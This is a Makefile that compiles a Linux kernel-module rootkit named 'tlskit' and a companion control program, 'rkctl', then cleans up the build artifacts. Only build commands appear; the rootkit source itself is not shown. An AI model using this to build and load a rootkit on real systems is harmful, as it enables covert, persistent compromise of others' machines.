SRC_DIR     := src
ROOTKIT     := tlskit

all: rkctl tlskit

obj-m += $(ROOTKIT).o

tlskit-objs += $(SRC_DIR)/lkm.o

tlskit:
	echo "Compiling lkm tlskit ..."
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	# remove the unnecessary files
	rm -f $(SRC_DIR)/*.o *.mod.c *.o modules.order Module.symvers

rkctl: $(SRC_DIR)/rkctl.c
	echo "Compiling tlskit control program ..."
	gcc -o rkctl $(SRC_DIR)/rkctl.c

clean:
	rm -rf rkctl